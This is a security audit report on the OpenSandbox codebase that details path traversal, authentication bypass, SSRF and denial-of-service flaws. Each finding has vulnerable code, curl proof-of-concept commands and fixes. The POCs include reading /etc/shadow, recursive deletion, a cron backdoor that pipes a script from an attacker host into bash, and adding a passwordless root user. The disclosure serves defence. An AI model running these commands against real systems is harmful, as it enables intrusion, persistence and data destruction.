# OpenSandbox Security Audit Report

**Date:** 2026-03-05  
**Scope:** Full codebase security audit — server (Python/FastAPI), execd (Go), SDK, sandbox runtime  
**Focus:** Sandbox escape, path traversal, command injection, authentication bypass, SSRF

---

## Executive Summary

This audit identifies **6 high/critical severity** vulnerabilities and **4 medium severity** issues across the OpenSandbox codebase. The most dangerous issues are concentrated in the Go `execd` daemon which runs **inside** sandbox containers, where missing path validation on filesystem operations creates direct sandbox escape vectors — allowing code executing inside the sandbox to read, write, and delete arbitrary files on the host filesystem (when combined with container misconfigurations or shared volumes).

---

## Vulnerability Index

| # | Severity | Component | Vulnerability | CVSS Est. |
|---|----------|-----------|---------------|-----------|
| 1 | **CRITICAL** | execd (Go) | Path Traversal in File Download — arbitrary file read | 9.1 |
| 2 | **CRITICAL** | execd (Go) | Path Traversal in File Delete / RemoveDirs — arbitrary file/directory deletion | 9.1 |
| 3 | **CRITICAL** | execd (Go) | Path Traversal in File Upload — arbitrary file write | 9.1 |
| 4 | **HIGH** | execd (Go) | Path Traversal in File Info / Search / Replace — information disclosure & file modification | 7.5 |
| 5 | **HIGH** | execd (Go) | Authentication Bypass when access token is empty | 7.5 |
| 6 | **HIGH** | execd (Go) | Insecure File Permissions (0777) on uploaded files and created directories | 6.5 |
| 7 | **MEDIUM** | server (Python) | Proxy endpoint information disclosure — internal error details leaked | 5.3 |
| 8 | **MEDIUM** | server (Python) | Authentication bypass when no API key is configured | 5.3 |
| 9 | **MEDIUM** | execd (Go) | Proxy port injection — unrestricted SSRF to localhost ports | 5.0 |
| 10 | **MEDIUM** | execd (Go) | Denial of Service via unbounded file operations | 4.3 |

---

## Detailed Findings

### Vulnerability 1: Path Traversal in File Download (CRITICAL)

**File:** `components/execd/pkg/web/controller/filesystem_download.go`  
**Lines:** 30–40  
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

#### Description

The `DownloadFile()` handler takes a `path` query parameter directly from user input and passes it to `os.Open()` without any path sanitization, canonicalization, or boundary checking. An attacker can use `../` sequences to traverse out of the intended working directory and read any file accessible to the execd process.

#### Vulnerable Code

```go
// filesystem_download.go:30
func (c *FilesystemController) DownloadFile() {
    filePath := c.ctx.Query("path")  // User-controlled input
    if filePath == "" {
        // ...
        return
    }
    file, err := os.Open(filePath)   // Direct use — no sanitization
    // ...
}
```

#### POC

```bash
# Read /etc/passwd from inside a sandbox via the execd API
curl -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files/download?path=/etc/passwd"

# Read /etc/shadow (if execd runs as root)
curl -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files/download?path=/etc/shadow"

# Path traversal from a relative working directory
curl -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files/download?path=../../../../etc/passwd"
```

#### Impact

- Read any file on the filesystem accessible to the execd process
- If execd runs as root (common in containers), this includes `/etc/shadow`, SSH keys, application secrets
- When combined with shared host volumes, can read host filesystem files

#### Remediation

Add path canonicalization and enforce a sandbox root boundary:

```go
func (c *FilesystemController) DownloadFile() {
    filePath := c.ctx.Query("path")
    if filePath == "" {
        // ... error
        return
    }
    
    // Canonicalize and validate the path stays within sandbox boundary
    cleanPath := filepath.Clean(filePath)
    absPath, err := filepath.Abs(cleanPath)
    if err != nil {
        // ... error
        return
    }
    
    // Ensure path is within allowed sandbox root
    if !strings.HasPrefix(absPath, sandboxRoot) {
        // ... reject with 403
        return
    }
    
    file, err := os.Open(absPath)
    // ...
}
```

---

### Vulnerability 2: Path Traversal in File Delete / RemoveDirs (CRITICAL)

**File:** `components/execd/pkg/web/controller/filesystem.go`  
**Lines:** 83–97 (RemoveFiles), 170–185 (RemoveDirs)  
**CWE:** CWE-22

#### Description

Both `RemoveFiles()` and `RemoveDirs()` accept user-supplied paths via query parameters without validation. `RemoveDirs()` is especially dangerous because it calls `os.RemoveAll()` which recursively deletes entire directory trees.

#### Vulnerable Code

```go
// filesystem.go:82-97 — RemoveFiles
func (c *FilesystemController) RemoveFiles() {
    paths := c.ctx.QueryArray("path")   // User-controlled
    for _, filePath := range paths {
        if err := DeleteFile(filePath); err != nil {  // No boundary check
            // ...
        }
    }
}

// filesystem.go:170-185 — RemoveDirs
func (c *FilesystemController) RemoveDirs() {
    paths := c.ctx.QueryArray("path")   // User-controlled
    for _, dir := range paths {
        if err := os.RemoveAll(dir); err != nil {  // CRITICAL: recursive delete, no validation
            // ...
        }
    }
}
```

#### POC

```bash
# Delete /tmp directory recursively
curl -X DELETE -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/directories?path=/tmp"

# Delete critical system files
curl -X DELETE -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files?path=/etc/resolv.conf"

# Delete the execd binary itself (denial of service)
curl -X DELETE -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files?path=/opt/opensandbox/execd"
```

#### Impact

- Delete any file or directory tree on the filesystem
- Cause complete denial of service by deleting system binaries or libraries
- Potential sandbox escape by corrupting container filesystem to influence shared resources

---

### Vulnerability 3: Path Traversal in File Upload (CRITICAL)

**File:** `components/execd/pkg/web/controller/filesystem_upload.go`  
**Lines:** 104–135  
**CWE:** CWE-22

#### Description

The `UploadFile()` handler reads a target path from JSON metadata and uses it directly to write files. There is no validation that the path stays within the sandbox working directory. Combined with the use of `os.ModePerm` (0777), an attacker can write arbitrary files anywhere on the filesystem with world-readable/writable permissions.

#### Vulnerable Code

```go
// filesystem_upload.go:104-135
targetPath := meta.Path          // User-controlled from JSON metadata
// ...
targetDir := filepath.Dir(targetPath)
if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {  // 0777 permissions
    // ...
}
// ...
dst, err := os.OpenFile(targetPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, os.ModePerm)  // 0777
```

#### POC

```bash
# Write a cron job for persistence (if cron is available)
# Create metadata JSON: {"path": "/etc/cron.d/backdoor", "permission": {"mode": 644}}
echo '{"path":"/etc/cron.d/backdoor","permission":{"mode":644}}' > /tmp/meta.json
echo '* * * * * root curl http://attacker.com/shell.sh | bash' > /tmp/payload

curl -X POST -H "X-EXECD-TOKEN: <token>" \
  -F "metadata=@/tmp/meta.json;type=application/json" \
  -F "file=@/tmp/payload" \
  "http://<sandbox-host>:44772/files/upload"

# Overwrite /etc/passwd to add a root user
echo '{"path":"/etc/passwd","permission":{"mode":644}}' > /tmp/meta.json
echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd

curl -X POST -H "X-EXECD-TOKEN: <token>" \
  -F "metadata=@/tmp/meta.json;type=application/json" \
  -F "file=@/tmp/passwd" \
  "http://<sandbox-host>:44772/files/upload"
```

#### Impact

- Write arbitrary files anywhere on the filesystem with 0777 permissions
- Overwrite system configuration files (e.g., `/etc/passwd`, `/etc/shadow`)
- Plant backdoors or malicious scripts
- Potential container escape via overwriting sensitive container runtime files

---

### Vulnerability 4: Path Traversal in GetFilesInfo / SearchFiles / ReplaceContent (HIGH)

**File:** `components/execd/pkg/web/controller/filesystem.go`  
**Lines:** 62–79 (GetFilesInfo), 188–279 (SearchFiles), 282–329 (ReplaceContent)  
**CWE:** CWE-22

#### Description

Multiple filesystem operations accept user-supplied paths without boundary checking:

- `GetFilesInfo()` reveals metadata (owner, group, permissions, size) of any file
- `SearchFiles()` walks any directory tree using `filepath.Walk()`, enumerating all files
- `ReplaceContent()` reads and modifies any file's content

#### Vulnerable Code

```go
// GetFilesInfo — line 63
paths := c.ctx.QueryArray("path")
for _, filePath := range paths {
    fileInfo, err := GetFileInfo(filePath)  // No validation
}

// SearchFiles — line 189-221
path := c.ctx.Query("path")               // User-controlled
path, err := filepath.Abs(path)
err = filepath.Walk(path, func(...) { })   // Walks any directory

// ReplaceContent — line 294
for file, item := range request {
    file, err := filepath.Abs(file)         // No boundary check
    content, err := os.ReadFile(file)       // Reads any file
    os.WriteFile(file, ...)                 // Writes any file
}
```

#### POC

```bash
# Enumerate all files on the system
curl -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files/search?path=/&pattern=**"

# Read file permissions and ownership info for sensitive files
curl -H "X-EXECD-TOKEN: <token>" \
  "http://<sandbox-host>:44772/files/info?path=/etc/shadow&path=/root/.ssh/id_rsa"

# Modify /etc/hosts to redirect traffic
curl -X POST -H "X-EXECD-TOKEN: <token>" \
  -H "Content-Type: application/json" \
  -d '{"/etc/hosts": {"old": "localhost", "new": "localhost\n10.0.0.1 internal-api.company.com"}}' \
  "http://<sandbox-host>:44772/files/replace"
```

#### Impact

- Information disclosure: enumerate entire filesystem structure, ownership info
- File modification: change content of any file using string replacement
- DNS hijacking: modify `/etc/hosts` to redirect network traffic

---

### Vulnerability 5: Authentication Bypass when Access Token is Empty (HIGH)

**File:** `components/execd/pkg/web/router.go`  
**Lines:** 100–117  
**CWE:** CWE-287 (Improper Authentication)

#### Description

The `accessTokenMiddleware` in the execd Go component completely skips authentication when the configured token is an empty string. If the `EXECD_ACCESS_TOKEN` environment variable is not set (or set to empty), all API endpoints are accessible without credentials.

#### Vulnerable Code

```go
// router.go:100-117
func accessTokenMiddleware(token string) gin.HandlerFunc {
    return func(ctx *gin.Context) {
        if token == "" {          // Empty token = no auth at all
            ctx.Next()
            return
        }
        // ... token validation
    }
}
```

#### POC

```bash
# If EXECD_ACCESS_TOKEN is not set, all endpoints are accessible without auth
curl "http://<sandbox-host>:44772/files/download?path=/etc/passwd"
# No authentication header required — full API access
```

#### Impact

- Complete bypass of authentication for all execd API endpoints
- Combined with path traversal vulnerabilities, allows unauthenticated arbitrary file read/write/delete
- This is the default state if administrators don't explicitly configure a token

#### Remediation

Require a token to be configured, or generate a random token at startup:

```go
func accessTokenMiddleware(token string) gin.HandlerFunc {
    if token == "" {
        // Generate a random token and log it, or refuse to start
        log.Fatal("EXECD_ACCESS_TOKEN must be set")
    }
    return func(ctx *gin.Context) {
        // ... validate token
    }
}
```

---

### Vulnerability 6: Insecure File Permissions (0777) on Uploads and Directories (HIGH)

**File:** `components/execd/pkg/web/controller/filesystem_upload.go`  
**Lines:** 115, 135  
**File:** `components/execd/pkg/web/controller/utils.go`  
**Line:** 156  
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

#### Description

Files uploaded via the upload endpoint and directories created via `MakeDir()` use `os.ModePerm` (0777) as their default permission, making them world-readable, writable, and executable. Even though `ChmodFile()` is called after creation, there is a race window where files are accessible with 0777 permissions.

#### Vulnerable Code

```go
// filesystem_upload.go:115
os.MkdirAll(targetDir, os.ModePerm)  // 0777

// filesystem_upload.go:135
os.OpenFile(targetPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, os.ModePerm)  // 0777

// utils.go:156
os.MkdirAll(abs, os.ModePerm)  // 0777
```

#### Impact

- Any user on the system can read, modify, or execute uploaded files
- Race condition: files are created with 0777 permissions before `ChmodFile()` is called
- Sensitive data written to uploaded files may be accessible to other processes

#### Remediation

Use restrictive default permissions:

```go
os.MkdirAll(targetDir, 0750)
os.OpenFile(targetPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0640)
```

---

### Vulnerability 7: Proxy Information Disclosure (MEDIUM)

**File:** `server/src/api/lifecycle.py`  
**Lines:** 476–487  
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

#### Description

The proxy endpoint includes internal error details (backend hostnames, IP addresses, stack traces) in HTTP error responses returned to the client.

#### Vulnerable Code

```python
# lifecycle.py:476-487
except httpx.ConnectError as e:
    raise HTTPException(
        status_code=502,
        detail=f"Could not connect to the backend sandbox {endpoint}: {e}",  # Leaks internal endpoint
    )
except Exception as e:
    raise HTTPException(
        status_code=500, detail=f"An internal error occurred in the proxy: {e}"  # Leaks stack trace
    )
```

#### POC

```bash
# Probe for internal network topology
curl -X GET "http://<server>:8080/sandboxes/nonexistent-id/proxy/8080/test" \
  -H "OPEN-SANDBOX-API-KEY: valid-key"
# Response reveals internal hostnames and IP addresses in error message
```

#### Impact

- Reveals internal network topology (hostnames, IP addresses, ports)
- Reveals software versions and stack traces

#### Remediation

Return generic error messages:

```python
except httpx.ConnectError:
    raise HTTPException(status_code=502, detail="Could not connect to the backend sandbox.")
except Exception:
    logger.exception("Proxy error for sandbox %s", sandbox_id)
    raise HTTPException(status_code=500, detail="An internal error occurred.")
```

---

### Vulnerability 8: Server Authentication Bypass when No API Key Configured (MEDIUM)

**File:** `server/src/middleware/auth.py`  
**Lines:** 102–104  
**CWE:** CWE-287

#### Description

The Python server's authentication middleware skips API key validation entirely when no API key is configured (`api_key` is empty or not set in config.toml). This means all lifecycle API endpoints (create/delete/list sandboxes) are publicly accessible by default.

#### Vulnerable Code

```python
# auth.py:102-104
if not self.valid_api_keys:
    return await call_next(request)  # Skip auth entirely
```

#### Impact

- All sandbox lifecycle operations (create, delete, pause, resume) are accessible without authentication
- An attacker could create sandboxes to consume resources (DoS)
- An attacker could delete existing sandboxes (disruption)

#### Note on Expected Use Case

This may be intentional for development/local environments. However, there should be a clear warning logged when running without authentication, and production deployments should enforce API key configuration.

---

### Vulnerability 9: Proxy Port Injection — Unrestricted SSRF to localhost (MEDIUM)

**File:** `components/execd/pkg/web/proxy.go`  
**Lines:** 40–58  
**CWE:** CWE-918 (Server-Side Request Forgery)

#### Description

The proxy middleware in execd accepts any port number and proxies requests to `127.0.0.1:<port>`. There is no validation that the port is a valid number or within expected ranges. An attacker with access to the execd API can use this to scan and access any service running on localhost within the sandbox.

#### Vulnerable Code

```go
// proxy.go:40-58
rest := strings.TrimPrefix(r.URL.Path, "/proxy/")
parts := strings.SplitN(rest, "/", 2)
port := parts[0]  // No numeric validation
target := &url.URL{
    Scheme: "http",
    Host:   "127.0.0.1:" + port,  // Direct concatenation
}
```

#### POC

```bash
# Scan for services on localhost via the proxy
for port in 22 80 443 3306 5432 6379 8080 8888 9090; do
  curl -s -o /dev/null -w "%{http_code} port:$port\n" \
    "http://<sandbox-host>:44772/proxy/$port/"
done

# Access Jupyter server directly (bypass intended restrictions)
curl "http://<sandbox-host>:44772/proxy/8888/api/kernels" \
  -H "X-EXECD-TOKEN: <token>"
```

#### Impact

- Scan and access any TCP service on localhost within the sandbox
- Bypass intended service isolation within the sandbox
- Access Jupyter kernel management APIs directly

---

### Vulnerability 10: Denial of Service via Unbounded File Operations (MEDIUM)

**File:** `components/execd/pkg/web/controller/filesystem.go`  
**Lines:** 63, 84, 172  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

#### Description

Multiple filesystem endpoints accept arrays of paths via query parameters with no limit on the number of items. An attacker can send requests with thousands of file paths, causing resource exhaustion.

Additionally, `SearchFiles()` with `path=/` and `pattern=**` will attempt to walk the entire filesystem.

#### POC

```bash
# Send a request to delete 10000 paths
python3 -c "
paths = '&'.join([f'path=/nonexistent/{i}' for i in range(10000)])
print(f'http://<sandbox-host>:44772/files?{paths}')
" | xargs curl -X DELETE

# Enumerate entire filesystem (resource exhaustion)
curl "http://<sandbox-host>:44772/files/search?path=/&pattern=**"
```

#### Impact

- CPU and memory exhaustion in the execd process
- Potential filesystem I/O saturation
- Denial of service for other sandbox operations

---

## Sandbox Escape Analysis

### Architecture Context

The `execd` daemon runs **inside** each sandbox container and provides file/code/command execution APIs. It is the primary attack surface for sandbox escape.

### Escape Vectors

1. **Direct filesystem access (Vulnerabilities 1-4):** Since execd runs inside the container, path traversal gives access to the container's entire filesystem. In default Docker configurations:
   - The container filesystem is isolated from the host
   - However, any mounted volumes (`-v` or bind mounts) expose host directories
   - If `storage.allowed_host_paths` is empty (default), any host path can be mounted

2. **Command execution (by design):** The `/command` endpoint executes arbitrary shell commands via `bash -c`. This is an intended feature, but combined with the above filesystem access, an attacker could:
   - Modify container networking configuration
   - Access mounted secrets or configuration files
   - Attempt to exploit kernel vulnerabilities for container escape

3. **The security hardening in docker.py is well-implemented:**
   - `drop_capabilities` removes dangerous capabilities (SYS_ADMIN, NET_ADMIN, SYS_PTRACE, etc.)
   - `no_new_privileges: true` prevents privilege escalation
   - Optional AppArmor and seccomp profiles
   - `pids_limit` prevents fork bombs
   - These mitigations are **good** but only apply when properly configured

### Key Risk: Default Configuration

The default configuration (`example.config.toml`) does NOT require:
- An API key for the lifecycle server
- An access token for execd
- Restricted host path prefixes for volume mounts

This means a fresh installation with default settings has **no authentication** and allows **unrestricted volume mounts**.

---

## Recommendations Summary

### Immediate (Critical/High)

1. **Add path validation to all execd filesystem operations** — Implement a `sandboxRoot` boundary check that canonicalizes paths and rejects any path outside the intended sandbox workspace.

2. **Require authentication tokens** — Generate random tokens at startup if none configured, and log warnings when running without auth.

3. **Fix file permissions** — Use 0750 for directories and 0640 for files instead of 0777.

4. **Add rate limits and size bounds** — Limit the number of paths per request and the size of file uploads.

### Short-term (Medium)

5. **Sanitize error messages** — Remove internal details from proxy error responses.

6. **Validate proxy port numbers** — Ensure port is numeric and within valid range (1-65535).

7. **Add request size limits** — Configure maximum request body sizes for file upload endpoints.

### Long-term

8. **Consider running execd as non-root** — Reduce the impact of filesystem vulnerabilities.

9. **Add audit logging** — Log all file and command operations for forensic analysis.

10. **Implement allowlist-based path access** — Only allow access to explicitly approved directories.

---

## Disclaimer

This audit was performed through static code analysis. Runtime testing in a production environment may reveal additional issues. The vulnerabilities identified in the `execd` component are most impactful when execd runs inside a container with mounted host volumes, which is a common production deployment pattern. The Docker security hardening (capability dropping, seccomp, etc.) significantly reduces the blast radius of these issues but does not eliminate the file access risks within the container filesystem itself.
